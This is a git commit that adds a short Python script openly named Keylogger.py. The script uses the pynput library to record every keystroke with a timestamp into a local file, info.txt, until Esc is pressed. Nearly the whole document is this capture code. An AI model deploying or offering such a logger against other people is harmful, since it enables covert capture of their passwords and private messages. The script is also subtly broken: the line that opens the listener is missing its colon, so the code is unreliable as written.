26e5ded2523a13fc1d6f6503ce2ec9597aad0087
anshi-shukla <92010014+anshi-shukla@users.noreply.github.com>
2021-10-05 23:05:57 -0700

    Add files via upload

---
+++ Keylogger.py
@@ -0,0 +1,19 @@
+from pynput.keyboard import Key, Listener
+import logging
+import sys
+
+# blank if same folder
+log_dir = ""
+
+logging.basicConfig(filename=(log_dir + "info.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")
+
+def on_press(key):
+    logging.info(key)
+
+def on_release(key):
+    if str(key) == 'Key.esc':
+        sys.exit(0)
+
+if __name__ == "__main__":
+    with Listener (on_press=on_press, on_release=on_release) as listener
+        listener.join()
